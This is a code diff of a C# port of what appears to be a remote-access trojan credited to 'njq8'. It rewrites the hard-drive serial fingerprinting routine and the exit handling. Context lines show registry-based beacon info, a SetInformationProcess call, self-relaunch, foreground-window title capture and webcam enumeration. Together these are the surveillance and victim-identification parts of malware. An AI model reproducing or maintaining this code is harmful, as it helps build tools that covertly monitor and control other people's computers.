@@ -13,6 +13,7 @@ using System.IO.Compression;
 using System.Drawing.Imaging;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
+using Microsoft.VisualBasic;
 
 /**
  * Original Author: njq8 (VB.NET)
@@ -663,7 +664,7 @@ namespace j
 
                                 SetInformationProcess(0);
 
-                                Application.Exit();
+                                Environment.Exit(0);
 
                                 break;
 
@@ -673,7 +674,7 @@ namespace j
 
                                 Process.Start(CurrentAssemblyFileInfo.FullName);
 
-                                Application.Exit();
+                                Environment.Exit(0);
 
                                 break;
                         }
@@ -1131,7 +1132,6 @@ namespace j
         public static string GetGenericInfo()
         {
             string info = "ll" + Splitter;
-
             try
             {
                 if ("" + GetValueFromRegistry("vn", "") == "")
@@ -1289,35 +1289,24 @@ namespace j
 
         public static string GetHardDriveSerialNumber()
         {
+            string result;
             try
             {
-                uint volumeSerialNumber;
-
-                StringBuilder lpVolumeNameBuffer = new StringBuilder();
-
-                uint lpMaximumComponentLength;
-
-                FileSystemFeature lpFileSystemFlags;
-
-                StringBuilder lpFileSystemNameBuffer = new StringBuilder();
-
-                GetVolumeInformation(
-                    Environment.GetEnvironmentVariable("SystemDrive") + @"\",
-                    lpVolumeNameBuffer,
-                    0,
-                    out volumeSerialNumber,
-                    out lpMaximumComponentLength,
-                    out lpFileSystemFlags,
-                    lpFileSystemNameBuffer,
-                    0
-                );
-
-                return volumeSerialNumber.ToString("X");
+                string text = Interaction.Environ("SystemDrive") + "\\";
+                string text2 = null;
+                int nVolumeNameSize = 0;
+                int num = 0;
+                int num2 = 0;
+                string text3 = null;
+                int number = 0;
+                GetVolumeInformation(ref text, ref text2, nVolumeNameSize, ref number, ref num, ref num2, ref text3, 0);
+                result = Conversion.Hex(number);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
-                return "ERR";
+                result = "ERR";
             }
+            return result;
         }
 
         public static bool CameraExists()
@@ -1364,17 +1353,8 @@ namespace j
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
 
-        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        extern static bool GetVolumeInformation(
-          string rootPathName,
-          StringBuilder volumeNameBuffer,
-          int volumeNameSize,
-          out uint volumeSerialNumber,
-          out uint maximumComponentLength,
-          out FileSystemFeature fileSystemFlags,
-          StringBuilder fileSystemNameBuffer,
-          int nFileSystemNameSize);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
+        private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);
 
         //This function enables enumerate the web cam devices
         [DllImport("avicap32.dll")]
